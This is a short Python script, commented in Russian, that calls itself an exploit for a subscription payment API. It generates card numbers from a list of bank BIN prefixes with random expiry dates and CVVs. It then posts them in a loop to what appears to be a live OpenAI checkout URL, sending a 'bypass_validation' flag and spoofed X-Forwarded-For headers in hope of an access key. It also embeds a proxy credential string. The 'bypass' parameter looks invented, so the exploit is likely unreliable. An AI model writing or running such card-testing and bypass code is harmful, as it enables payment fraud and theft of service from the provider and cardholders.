import requests
import re
import random
import string
import threading
proxies = {"ss://YWVzLTI1Ni1nY206OWQyYjM2ZjktNjQwMS00ZTY4LTg5NDItNWE1NTY1NGIwZmI1@192.142.54.104:57623?type=tcp#🇳🇱netherlands%20-%20okvpn.me"}
# Генератор виртуальных карт с рандомизированными BIN номерами
def generate_virtual_card():
    bin_list = ["400303", "400307", "400356", "400377", "401662", "404135", "413265", "415602", "416443", "417779", "419801", "423300", "423306", "424467", "427717", "431433", "440562", "440563", "440564", "440565", "447704", "447705", "447706", "459895", "462780", "467560", "467561", "467562", "490472", "510145", "512496", "512752", "512801", "517511", "524345", "524737", "535451", "537601", "540093", "540813", "540993", "546875", "546876", "547089", "548000", "548318", "548319", "549831", "552204", "553089", "557834", "558291", "559486", "601696", "623357", "676200", "676204", "676205", "676414"]  # Пример BIN номеров
    chosen_bin = random.choice(bin_list)
    remaining_digits = ''.join(random.choices(string.digits, k=10))
    card_number = chosen_bin + remaining_digits
    expiry = f"{random.randint(1,12):02d}/{random.randint(28,35)}"
    cvv = ''.join(random.choices(string.digits, k=3))
    return card_number, expiry, cvv

# Эксплойт для уязвимости в API подписки
def exploit_subscription_api(card, expiry, cvv):
    url = "https://pay.openai.com/c/pay/cs_live_a1C5vLgjIROp38v2ofCFK8aaNOUjrgnBOMWJIjuexZZoY3oF4RZFndv7Te#fidpamZkaWAnPyd3cCcpJ3ZwZ3Zmd2x1cWxqa1BrbHRwYGtgdnZAa2RnaWBhJz9jZGl2YCknZHVsTmB8Jz8ndW5aaWxzYFowNE1Kd1ZyRjNtNGt9QmpMNmlRRGJXb1xTd38xYVA2Y1NKZGd8RmZOVzZ1Z0BPYnBGU0RpdEZ9YX1GUHNqV200XVJyV2RmU2xqc1A2bklOc3Vub20yTHRuUjU1bF1Udm9qNmsnKSdjd2poVmB3c2B3Jz9xd3BgKSdnZGZuYndqcGthRmppancnPycmY2NjY2NjJyknaWR8anBxUXx1YCc%2FJ3Zsa2JpYFpscWBoJyknYGtkZ2lgVWlkZmBtamlhYHd2Jz9xd3BgeCUl"
    payload = {
        "card_number": card,
        "expiry_date": expiry,
        "cvv": cvv,
        "plan_id": "premium_year",
        "bypass_validation": "true"  # Параметр для уязвимого эндпоинта
    }
    headers = {
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    response = requests.post(url, json=payload, headers=headers, timeout=10)
    if response.status_code == 200:
        return response.json().get('access_key')
    return None

# Основной цикл для атаки
def main():
    for _ in range(50):
        card_data = generate_virtual_card()
        access_key = exploit_subscription_api(*card_data)
        if access_key:
            print(f"[SUCCESS] Key: {access_key}")
            break

if __name__ == "__main__":
    main()
